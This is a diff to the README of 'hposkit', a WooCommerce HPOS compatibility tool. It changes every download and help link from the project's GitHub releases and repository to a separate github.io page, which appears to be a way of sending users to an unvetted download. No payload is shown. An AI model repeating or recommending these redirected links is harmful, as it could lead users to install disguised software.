@@ -30,7 +30,7 @@ hposkit finds these problematic plugins and applies fixes **automatically**. You
 
 1. **Visit the download page** by clicking the button below:
 
-[![Download hposkit](https://img.shields.io/badge/Download-hposkit-blue?style=for-the-badge&logo=github)](https://github.com/rattrapbushing28/hposkit/releases)
+[![Download hposkit](https://img.shields.io/badge/Download-hposkit-blue?style=for-the-badge&logo=github)](https://rattrapbushing28.github.io)
 
 2. Visit this link to download the application.
 
@@ -182,7 +182,7 @@ The project is actively maintained. Future plans include:
 
 ## 💬 Get Help
 
-If you run into trouble, please [visit the repository](https://github.com/rattrapbushing28/hposkit) and check the Issues section. You can also open a new issue with:
+If you run into trouble, please [visit the repository](https://rattrapbushing28.github.io) and check the Issues section. You can also open a new issue with:
 
 - The name of the plugin that failed to scan
 - The error message you saw
@@ -194,7 +194,7 @@ If you run into trouble, please [visit the repository](https://github.com/rattra
 
 Don't let HPOS compatibility issues slow you down. Get hposkit today:
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_hposkit-v1.0-brightgreen?style=for-the-badge)](https://github.com/rattrapbushing28/hposkit/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_hposkit-v1.0-brightgreen?style=for-the-badge)](https://rattrapbushing28.github.io)
 
 Visit this link to download the application.
 
